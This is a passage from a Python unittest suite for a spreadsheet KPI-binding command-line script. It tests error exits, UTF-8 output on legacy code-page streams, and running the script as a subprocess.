                    bind_kpi.validate_formulas.ValidateError("a validate problem")):
            with self.subTest(exc=type(exc).__name__), mock.patch.object(bind_kpi, "bind", side_effect=exc):
                rc, out, err = self.run_cli()
                self.assertEqual((rc, out, err), (2, "", "error: %s\n" % exc))

    def test_a_baseline_function_the_client_does_not_register_is_refused(self):
        self.write(self.baseline_path, intake_xlsx.dump_bytes(bf.edit(bf.small_baseline(), {"H8": {"content": "=N(A1)"}})))
        self.expect_error(contains="function N() is not defined")


class EncodingTests(BindCliCase):
    def wrapper(self, encoding):
        return io.TextIOWrapper(io.BytesIO(), encoding=encoding, newline="")

    def read_back(self, stream):
        stream.flush()
        return stream.buffer.getvalue().decode("utf-8")

    def test_a_stdout_with_a_legacy_code_page_gets_utf8(self):
        for encoding, name in (("cp949", "연도별 생산 보고서"), ("cp1252", "Báo cáo sản lượng ệ")):
            with self.subTest(encoding=encoding):
                self.write(self.spec_path, json.dumps(bf.make_spec(name=name), ensure_ascii=False))
                if os.path.exists(self.out_path):
                    os.unlink(self.out_path)
                out, err = self.wrapper(encoding), self.wrapper(encoding)
                rc = bind_kpi.main(self.argv(), out, err)
                self.assertEqual(rc, 0)
                text = self.read_back(out)
                self.assertEqual(json.loads(text)["name"], name)
                self.assertIn(name, text)                               # written as text, not as \uXXXX escapes
                self.assertEqual(self.read_back(err), "")

    def test_an_error_line_with_non_ascii_text_is_written_without_a_crash(self):
        for encoding, source in (("cp949", "원본_뷰"), ("cp1252", "nguồn ệ")):
            with self.subTest(encoding=encoding):
                spec = bf.make_spec([{"cells": "D5:F5", "source": source, "columns": "months"}])
                self.write(self.spec_path, json.dumps(spec, ensure_ascii=False))
                out, err = self.wrapper(encoding), self.wrapper(encoding)
                rc = bind_kpi.main(self.argv(), out, err)
                self.assertEqual(rc, 2)
                text = self.read_back(err)
                self.assertTrue(text.startswith("error: "))
                self.assertIn(source, text)
                self.assertEqual(self.read_back(out), "")

    def test_a_stream_that_cannot_be_reconfigured_is_used_as_it_is(self):
        class Plain(io.StringIO):
            def reconfigure(self, **kwargs):
                raise ValueError("cannot change the encoding now")

        out, err = Plain(), Plain()
        rc = bind_kpi.main(self.argv(), out, err)
        self.assertEqual(rc, 0)
        self.assertEqual(json.loads(out.getvalue())["lists"], 2)

    def test_the_streams_are_reconfigured_with_utf8_and_backslashreplace(self):
        calls = []

        class Recording(io.StringIO):
            def reconfigure(self, **kwargs):
                calls.append(kwargs)

        bind_kpi.main(self.argv(), Recording(), Recording())
        self.assertEqual(calls, [{"encoding": "utf-8", "errors": "backslashreplace"}] * 2)


# ---------------------------------------------------------------- the script as a program

class SubprocessTests(BindCliCase):
    def run_script(self, *argv):
        script = os.path.join(REPO, "scripts", "bind_kpi.py")
        env = {k: v for k, v in os.environ.items() if k in ("PATH", "HOME", "SYSTEMROOT")}
        # no -I: the script imports its siblings (intake_xlsx, validate_formulas) from its own folder
        return subprocess.run([sys.executable, script, *argv], capture_output=True, timeout=60, env=env,
                              cwd=self.work)

    def test_a_run_writes_the_file_and_prints_the_report(self):
        done = self.run_script(*self.argv())
        self.assertEqual((done.returncode, done.stderr), (0, b""))
        self.assertEqual(json.loads(done.stdout)["bound_cells"], 6)
        self.assertTrue(os.path.exists(self.out_path))

    def test_a_refusal_exits_2_with_one_line_on_stderr(self):
        self.write(self.spec_path, json.dumps(bf.make_spec([{"cells": "D5", "source": "new_view", "column": "m1"}])))
        done = self.run_script(*self.argv())
        self.assertEqual(done.returncode, 2)
        self.assertEqual(done.stdout, b"")
        self.assertEqual(len(done.stderr.decode().splitlines()), 1)
        self.assertIn(AC7, done.stderr.decode())

    def test_usage_error_exits_2(self):
        done = self.run_script("--baseline", self.baseline_path)
        self.assertEqual(done.returncode, 2)
        self.assertNotIn(b"Traceback", done.stderr)


if __name__ == "__main__":
    unittest.main()
